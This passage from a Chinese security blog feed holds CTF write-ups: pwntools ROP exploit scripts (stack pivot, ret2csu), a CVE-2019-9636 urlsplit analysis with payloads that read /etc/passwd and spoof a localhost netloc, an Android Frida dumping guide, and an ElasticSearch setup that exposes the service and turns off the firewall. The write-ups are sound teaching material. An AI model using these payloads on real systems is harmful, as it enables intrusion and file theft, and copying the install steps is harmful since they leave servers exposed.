class="token comment" spellcheck="true"># 溢出字节</span>ret2win_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"ret2win"</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true"># 得到ret2win函数的地址</span>foothold_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 得到foothold_function</span>offset <span class="token operator">=</span> ret2win_sym <span class="token operator">-</span> foothold_sym                <span class="token comment" spellcheck="true"># 计算出foothold到ret2win函数的偏移</span>foothold_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>foothold_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>pop_eax <span class="token operator">=</span> <span class="token number">0x080488c0</span>            <span class="token comment" spellcheck="true"># pop eax; ret</span>pop_ebx <span class="token operator">=</span> <span class="token number">0x08048571</span>            <span class="token comment" spellcheck="true"># pop ebx; ret</span>mov_eax_eax <span class="token operator">=</span> <span class="token number">0x080488c4</span>        <span class="token comment" spellcheck="true"># mov eax, [eax]; ret</span>add_eax_ebx <span class="token operator">=</span> <span class="token number">0x080488c7</span>        <span class="token comment" spellcheck="true"># add eax, ebx; ret</span>call_eax <span class="token operator">=</span> <span class="token number">0x080486a3</span>            <span class="token comment" spellcheck="true"># call eax</span>xchg_eax_esp <span class="token operator">=</span> <span class="token number">0x080488c2</span>        <span class="token comment" spellcheck="true"># xchg eax, esp; ret</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The Old Gods kindly bestow upon you a place to pivot: "</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 获得程序打印出来的heap地址 也就是我们第一次写入的内容地址.</span>payload <span class="token operator">=</span> b<span class="token string">""</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>foothold_plt<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>foothold_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_eax_eax<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>add_eax_ebx<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>call_eax<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xchg_eax_esp<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 让eax和esp两个寄存器交换内容</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/pivot/1.jpg" alt></p><p>真实题目:<br><a href="https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN" target="_blank" rel="noopener">Black Watch 入群题 PWN</a></p><h5 id="64位-6"><a href="#64位-6" class="headerlink" title="64位:"></a><a href>64位</a>:</h5><p>和32位差不多</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pivot"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libpivot.so"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pivot"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>foothold_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>foothold_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>foothold_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>ret2win <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'ret2win'</span><span class="token punctuation">]</span>offset <span class="token operator">=</span> ret2win <span class="token operator">-</span> foothold_symmov_rax_rax <span class="token operator">=</span> <span class="token number">0x0000000000400b05</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b00</span>call_rax <span class="token operator">=</span><span class="token number">0x00000000040098e</span>add_rax_rbp <span class="token operator">=</span> <span class="token number">0x00000000000400b09</span>pop_rbp <span class="token operator">=</span> <span class="token number">0x0000000000400900</span>xchg_rax_rsp <span class="token operator">=</span> <span class="token number">0x0000000000400b02</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The Old Gods kindly bestow upon you a place to pivot: "</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>foothold_plt<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>foothold_got<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rax_rax<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rax_rbp<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_rax<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x08</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xchg_rax_rsp<span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into libpivot.so"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h5 id="64位-7"><a href="#64位-7" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/ret2csu.zip" target="_blank" rel="noopener">64位</a>:</h5><p><img src="/images/14/ret2csu/1.jpg" alt><br>程序要求我们call<code>ret2win</code>这个函数, 同时<code>rdx</code>寄存器要放入<code>0xdeadcafebabebeef</code>.</p><p>通过<code>ROPgadget</code>并没有找到<code>pop rdx; ret</code>之类的, 但是从<code>IDA</code>进行分析, 可以看到<code>__libc_csu_init</code>函数中, 有<code>pop r15</code>和<code>mov rdx, r15</code>之类的, 可以间接进行赋值.<br><img src="/images/14/ret2csu/2.jpg" alt></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./ret2csu"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>init_addr <span class="token operator">=</span> <span class="token number">0x0600E10</span>mov_rdx_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400880</span>pop_rbx <span class="token operator">=</span> <span class="token number">0x000000000040089A</span>ret2win <span class="token operator">=</span> <span class="token number">0x00000000004007B1</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0x28</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbx<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop rbx</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop rbp   填写1因为0x400880那串里面有一个add rbx, 1;  再往后有一个cmp, 如果不填写1就又跳回来了.</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>init_addr<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># pop r12  如果不init, setvbuf会将edx填写为0xffffffff</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop r13</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     <span class="token comment" spellcheck="true"># pop r14</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xdeadcafebabebeef</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># pop r15</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rdx_r15<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># rbx</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># rbp</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r12</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r13</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r14</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># r15</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>ret2win<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>如果不理解可以通过IDA+Pwntools远程调试, 看清楚栈中数据, 就会理解了。</p><p><img src="/images/14/ret2csu/3.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下学习ROP的基础题目.&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="PWN" scheme="https://helianthus.top/tags/PWN/"/>
    
      <category term="ROP" scheme="https://helianthus.top/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>Python 3.7.2 urllib.parse.urlsplit 漏洞分析</title>
    <link href="https://helianthus.top/2020/05/27/13-Python-3-7-2-urlsplit-cve/"/>
    <id>https://helianthus.top/2020/05/27/13-Python-3-7-2-urlsplit-cve/</id>
    <published>2020-05-27T13:29:33.000Z</published>
    <updated>2020-05-27T06:32:17.395Z</updated>
    
    <content type="html"><![CDATA[<p>Python 3.7.2的<code>urllib.parse</code>模块下<code>urlsplit</code>错误的处理字符导致漏洞。</p><a id="more"></a><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。</p><p>例如，在直接比较中, <code>\uFF03</code>不等于<code>＃</code>，而是统一化为<code>＃</code>，这会更改 URL 的片段部分。</p><p>类似地，<code>\u2100</code> 统一化为<code>a/c</code>，它引入了路径段。</p><p><code>℅</code>解析为<code>c/o</code><br><code>℆</code>解析为<code>c/u</code></p><p><img src="/images/13/1.png" alt></p><h1 id="CTF例子"><a href="#CTF例子" class="headerlink" title="CTF例子"></a>CTF例子</h1><h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>题目链接: <a href="https://buuoj.cn/challenges#[SUCTF%202019]Pythonginx" target="_blank" rel="noopener">Pythonginx</a><br>这个题目通过构造<code>℆</code> 使其构造为<code>?url=file://suctf.c℅pt/../etc/passwd</code>, 以此解析成<code>suctf.cc/opt/../etc/passwd</code>, 就可以看到<code>/etc/passwd</code>的内容.<br><img src="/images/13/2.png" alt></p><h4 id="SharkyCTF-Aqua-World"><a href="#SharkyCTF-Aqua-World" class="headerlink" title="[SharkyCTF]Aqua World"></a>[SharkyCTF]Aqua World</h4><p>题目链接: <a href="https://ctfd.sharkyctf.xyz/challenges#Aqua%20World" target="_blank" rel="noopener">Aqua World</a><br>这个题目需要以<code>本地</code>的地址访问到这个网站, 题目也提示了要使urlsplit后的<code>netloc</code>为<code>本地地址</code>, 然后通过F12查看服务器的Python版本是<code>3.7.2</code><br><img src="/images/13/3.png" alt></p><p>这个网站存在一个anonymous的登录, 尝试分割这个url, 参考<code>CVE-2019-9636</code>, 可以得到<br><img src="/images/13/4.png" alt></p><p>继续参考, 可以看到一个例子:</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> u <span class="token operator">=</span> <span class="token string">"https://example.com\uFF03@bing.com"</span><span class="token operator">>></span><span class="token operator">></span> urlsplit<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc<span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>bing<span class="token punctuation">.</span>com</code></pre><p>于是我们尝试<br><code>http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query?flag=flag</code>根据上面的例子进行更改, 为  <code>http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query\uFF03@localhost?flag=flag</code></p><p>发送payload!</p><p><img src="/images/13/5.png" alt></p><p>可以看到<code>netloc</code>已经被更改了, 但是没有得到flag, 于是更改payload的<code>localhost</code>为<code>127.0.0.1</code>, 再次进行尝试.</p><p><img src="/images/13/6.png" alt></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方解决办法是, 遇到这几个特殊字符直接抛出<code>Value Error</code><br><img src="/images/13/7.png" alt></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</a></p><p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">CVE-2019-10160：urlsplit NFKD 标准化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python 3.7.2的&lt;code&gt;urllib.parse&lt;/code&gt;模块下&lt;code&gt;urlsplit&lt;/code&gt;错误的处理字符导致漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络安全" scheme="https://helianthus.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Python" scheme="https://helianthus.top/tags/Python/"/>
    
      <category term="CVE" scheme="https://helianthus.top/tags/CVE/"/>
    
      <category term="URLSPLIT" scheme="https://helianthus.top/tags/URLSPLIT/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯 安卓逆向 bang</title>
    <link href="https://helianthus.top/2020/05/11/12-wangdingCUP-bang-reverse/"/>
    <id>https://helianthus.top/2020/05/11/12-wangdingCUP-bang-reverse/</id>
    <published>2020-05-11T14:04:38.000Z</published>
    <updated>2020-05-27T06:35:56.936Z</updated>
    
    <content type="html"><![CDATA[<p>参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下…</p><a id="more"></a><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Python3</li><li>Jadx-GUI</li><li>Frida  (<code>python -m pip install frida-tools</code>)</li><li><a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">Frida-server</a></li><li><a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">Frida-DEXDump</a></li><li><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip" target="_blank" rel="noopener">ADB</a></li><li>安卓模拟器(推荐夜神安卓模拟器)</li></ul><h2 id="Go"><a href="#Go" class="headerlink" title="Go?"></a>Go?</h2><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>将题目先安装进模拟器, 然后运行起来.</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>将<code>adb</code>连接到模拟器, <code>adb connect 127.0.0.1:62001</code>, 看到success就代表连接成功了.</p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>将适合自己模拟器系统的<code>frida-server</code>放入模拟器里.<br>把下载的<code>frida-server</code>也就是<code>frida-server-12.8.20-android-x86.xz</code>,<br>解压成为<code>frida-server-12.8.20-android-x86</code><br>(因为我的夜神模拟器里是x86架构的.) 可以如下命令查看手机版本</p><pre><code>adb shell getprop ro.product.cpu.abi</code></pre><p>将解压后的文件push到手机里面、加执行权限、并运行。</p><pre class=" language-shell"><code class="language-shell">adb push frida-server-12.8.20-android-x86 /data/local/tmp/frida-serveradb shellcd /data/local/tmpchmod 775 frida-server./frida-server</code></pre><p>之后再开一个cmd窗口, 将端口转发到本机</p><pre><code>adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043</code></pre><h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><p>检查是否成功</p><pre><code>frida-ps -U</code></pre><p><img src="/images/12/frida-ps.jpg" alt></p><p>如果你和我一样, 那么恭喜.</p><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p>这时找到<code>Frida-DEXDump</code>, 运行<code>python main.py</code><br><img src="/images/12/dumped-dex.jpg" alt><br>就dump出了想要的内容. </p><p>再使用<code>JADX-GUI</code>, 打开得到的.dex文件, 就可以看到.<br><img src="/images/12/jadx.jpg" alt></p><hr><blockquote><p>还是太菜了…</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下…&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="Android" scheme="https://helianthus.top/tags/Android/"/>
    
      <category term="Reverse" scheme="https://helianthus.top/tags/Reverse/"/>
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Golang 垃圾回收剖析</title>
    <link href="https://helianthus.top/2020/03/10/11-Golang-Gc/"/>
    <id>https://helianthus.top/2020/03/10/11-Golang-Gc/</id>
    <published>2020-03-09T22:05:37.000Z</published>
    <updated>2020-05-27T23:37:03.969Z</updated>
    
    <content type="html"><![CDATA[<p>这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。</p><a id="more"></a><p>直接看大佬的文章, 讲的超级超级详细！！！<br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a><br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a><br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp;amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Golang" scheme="https://helianthus.top/categories/Golang/"/>
    
    
      <category term="Golang" scheme="https://helianthus.top/tags/Golang/"/>
    
      <category term="Gc" scheme="https://helianthus.top/tags/Gc/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch Centos7安装教程</title>
    <link href="https://helianthus.top/2020/02/14/10-ElasticSearch-Quick-Start/"/>
    <id>https://helianthus.top/2020/02/14/10-ElasticSearch-Quick-Start/</id>
    <published>2020-02-13T16:27:13.000Z</published>
    <updated>2020-05-27T06:37:38.838Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ElasticSearch</strong>是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p><a id="more"></a><h1 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h1><h4 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h4><p>必须能连接互联网</p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# cat /etc/redhat-releaseCentOS Linux release 7.7.1908 (Core)</code></pre><h4 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h4><p>用来连接Centos主机. 没有的话直接用系统自带的SSH也可以。</p><h1 id="安装ElasticSearch"><a href="#安装ElasticSearch" class="headerlink" title="安装ElasticSearch"></a>安装ElasticSearch</h1><h3 id="前置任务-雾"><a href="#前置任务-雾" class="headerlink" title="前置任务 (雾)"></a>前置任务 (雾)</h3><p>由于<code>es</code>不支持以<code>root</code>用户运行，所以需要创建一个普通用户</p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# useradd elasticuser</code></pre><p>在自己喜欢的目录创建一个<code>es</code>的下载文件夹. 我选择<code>/usr/es</code></p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# mkdir -p /usr/es</code></pre><p>因为是用<code>root</code>用户创建的文件夹, <code>elasticuser</code>用户没有权限，所以要更改文件夹的权限</p><pre class=" language-shell"><code class="language-shell">[root@localhost usr]# chown elasticuser:elasticuser es/ -R</code></pre><p>切换成<code>elasticuser</code>用户进行下面的操作</p><pre class=" language-shell"><code class="language-shell">[root@localhost usr]# su elasticuser[elasticuser@localhost usr]$ whoamielasticuser</code></pre><h3 id="准备任务-大雾"><a href="#准备任务-大雾" class="headerlink" title="准备任务 (大雾)"></a>准备任务 (大雾)</h3><p>下载<code>es</code></p><pre class=" language-shell"><code class="language-shell">[elasticuser@localhost usr]$ cd es[elasticuser@localhost es]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.6.0-linux-x86_64.tar.gz</code></pre><p>解压</p><pre class=" language-shell"><code class="language-shell">[elasticuser@localhost es]$ lselasticsearch-7.6.0-linux-x86_64.tar.gz[elasticuser@localhost es]$ tar zxvf elasticsearch-7.6.0-linux-x86_64.tar.gz</code></pre><p>修改配置文件</p><ul><li><code>config/jvm.options</code>  (非必须, 目的是调整内存占用少一些)</li></ul><pre class=" language-yml"><code class="language-yml">-Xms512m-Xmx512m</code></pre><ul><li><code>config/elasticsearch.yml</code> (重要, 调整不好会导致ElasticSearch启动失败)</li></ul><p>不要直接复制粘贴, yml格式不允许写注释.</p><pre class=" language-yml"><code class="language-yml">network.host: 0.0.0.0                        // 修改完毕后可以外网访问cluster.name: "centos-cluster"               // 不改就启动起来提示Warningnode.name: "node-1"                          // 不改就启动起来提示Warningdiscovery.seed_hosts: ["127.0.0.1", "[::1]"] // 不改就启动起来提示Warningcluster.initial_master_nodes: ["node-1"]     // 不改就启动起来提示Warning</code></pre><p>尝试启动<code>ElasticSearch</code>.</p><pre class=" language-shell"><code class="language-shell">[elasticuser@localhost elasticsearch-7.6.0]$  ./bin/elasticsearch</code></pre><p>不失众望的报错了, 查看一下报错:<br><img src="/images/10/errors.png" alt></p><h3 id="解决错误-1"><a href="#解决错误-1" class="headerlink" title="解决错误 ([1])"></a>解决错误 ([1])</h3><p>遇到错误不慌， 一个个解决，首先是第一个</p><pre class=" language-shell"><code class="language-shell">[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]</code></pre><p>更改<code>/etc/security/limits.conf</code>, 这个时候要使用<code>root</code>用户更改, 写入以下内容</p><pre><code>* soft nofile 65535* hard nofile 65535</code></pre><p>写完是这样的<br><img src="/images/10/limit_conf.png" alt></p><p>接着重启一下服务器. 继续解决下一个bug.</p><h3 id="解决错误-2"><a href="#解决错误-2" class="headerlink" title="解决错误 ([2])"></a>解决错误 ([2])</h3><p>重启完， 先看看第一个错误解决了没有</p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# ulimit -Hn65535[root@localhost ~]# ulimit -Sn65535</code></pre><p>发现两个返回都是<code>65535</code>，就证明修改生效了。</p><p>然后看下一个报错</p><pre class=" language-shell"><code class="language-shell">[2]: max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]</code></pre><p>修改<code>/etc/sysctl.conf</code>， 添加</p><pre class=" language-yml"><code class="language-yml">vm.max_map_count=262144</code></pre><p>保存退出 并 执行</p><pre class=" language-shell"><code class="language-shell">[root@localhost bin]# sysctl -pvm.max_map_count = 262144</code></pre><p>再切换成<code>elasticuser</code>用户, 去运行<code>es</code>.<br><img src="/images/10/result.png" alt></p><p>可以看到运行成功了, 使用浏览器去访问<code>http://&lt;centos的IP地址&gt;:9200</code></p><p>emm 无法访问… </p><p>因为Centos默认开启了防火墙. 可以直接关闭防火墙 (启停服务需要root用户)</p><pre class=" language-shell"><code class="language-shell">[root@localhost bin]$ systemctl stop firewalld.service</code></pre><p>再重新运行<code>es</code>.</p><p><img src="/images/10/bowser.png" alt></p><p>ok, 安装完毕, 接下来就可以正常学习和使用<code>ElasticSearch</code>了。</p><blockquote><p>就这样！</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;ElasticSearch&lt;/strong&gt;是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://helianthus.top/categories/Linux/"/>
    
      <category term="ElasticSearch" scheme="https://helianthus.top/categories/Linux/ElasticSearch/"/>
    
    
      <category term="ES" scheme="https://helianthus.top/tags/ES/"/>
    
      <category term="ElasticSearch" scheme="https://helianthus.top/tags/ElasticSearch/"/>
    
      <category term="Centos" scheme="https://helianthus.top/tags/Centos/"/>
    
  </entry>
  
  <entry>
    <title>Windows下配置Flutter运行开发环境</title>
    <link href="https://helianthus.top/2019/12/19/9-Windows-Set-FlutterDev/"/>
    <id>https://helianthus.top/2019/12/19/9-Windows-Set-FlutterDev/</id>
    <published>2019-12-19T10:10:30.000Z</published>
    <updated>2020-05-27T06:39:15.862Z</updated>
    
